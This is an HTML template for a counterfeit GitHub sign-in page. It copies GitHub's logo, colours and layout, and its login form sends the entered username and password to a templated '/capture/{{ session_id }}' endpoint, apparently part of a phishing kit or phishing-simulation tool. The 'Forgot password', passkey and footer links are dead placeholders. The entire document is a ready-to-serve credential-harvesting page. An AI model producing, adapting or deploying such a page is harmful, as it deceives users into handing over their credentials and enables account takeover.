<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GitHub: Let's build from here</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif;
    background:#0d1117;
    color:#c9d1d9;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh
}
.container{max-width:340px;width:100%;padding:20px}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:48px;height:48px;fill:#fff}
.card{
    background:#161b22;
    border:1px solid #30363d;
    border-radius:6px;
    padding:20px
}
.card h1{font-size:24px;font-weight:300;text-align:center;margin-bottom:16px;color:#f0f6fc}
label{display:block;font-size:14px;font-weight:400;color:#c9d1d9;margin-bottom:6px}
input{
    width:100%;
    padding:10px 12px;
    background:#0d1117;
    border:1px solid #30363d;
    border-radius:6px;
    font-size:14px;
    color:#c9d1d9;
    outline:none;
    margin-bottom:16px
}
input:focus{border-color:#58a6ff;box-shadow:0 0 0 3px rgba(88,166,255,0.3)}
button[type="submit"]{
    width:100%;
    padding:10px 16px;
    background:#238636;
    color:#fff;
    font-size:14px;
    font-weight:600;
    border:1px solid rgba(240,246,252,0.1);
    border-radius:6px;
    cursor:pointer;
    margin-top:8px
}
button[type="submit"]:hover{background:#2ea043}
.fp{text-align:right;margin-top:4px}
.fp a{color:#58a6ff;font-size:12px;text-decoration:none}
.ft{text-align:center;margin-top:20px;font-size:12px;color:#8b949e;border-top:1px solid #21262d;padding-top:16px}
.ft a{color:#58a6ff;text-decoration:none}
.passkey{
    width:100%;
    padding:10px 16px;
    background:transparent;
    border:1px solid #30363d;
    border-radius:6px;
    color:#c9d1d9;
    font-size:14px;
    text-align:center;
    margin-top:8px
}
.passkey:hover{border-color:#8b949e}
</style>
</head>
<body>
<div class="container">
    <div class="logo">
        <svg viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
    </div>
    <div class="card">
        <h1>Sign in to GitHub</h1>
        <form action="/capture/{{ session_id }}" method="POST">
            <label>Username or email address</label>
            <input type="text" name="username" required>
            <label>Password</label>
            <input type="password" name="password" required>
            <div class="fp"><a href="#">Forgot password?</a></div>
            <button type="submit">Sign in</button>
        </form>
        <div class="passkey">Sign in with a passkey</div>
    </div>
    <div class="ft"><a href="#">Terms</a> &middot; <a href="#">Privacy</a> &middot; <a href="#">Docs</a> &middot; <a href="#">Contact GitHub Support</a></div>
</div>
</body>
</html>
